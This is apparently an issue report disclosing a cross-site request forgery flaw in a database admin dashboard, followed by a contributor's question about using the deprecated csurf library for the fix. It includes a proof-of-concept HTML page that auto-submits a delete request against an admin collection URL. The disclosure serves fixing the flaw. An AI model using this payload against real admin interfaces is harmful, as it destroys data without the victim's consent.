| Description The admin interface is vulnerable to Cross-site Request Forgery (CSRF). The admin dashboard area allows sensitive actions to be performed without validating that the request originated from the application . Sensitive actions include deleting tables of the admin . Impact Sensitive actions like deletion of Collections can be done by making the admin just click a link . POC ``` <html lang="en"> <head>     <meta charset="UTF-8">     <meta http-equiv="X-UA-Compatible" content="IE=edge">     <meta name="viewport" content="width=, initial-scale=1.0">     <title>Document</title> </head> <body>     <form action="http://127.0.0.1:8081/db/admin/(table_name here)" method="post">         <input type="text" name="_method" value="delete">     </form>     <script>         document.forms[0].submit();     </script> </body> </html> ``` |

| Hi guys! I see this issue still open and I'd like to do this. But the current csrf lib used in the project was deprecated and the current version is too old: [csurf](https://github.com/expressjs/csurf)  May I still using csurf to add csrf token along admin pages ? |
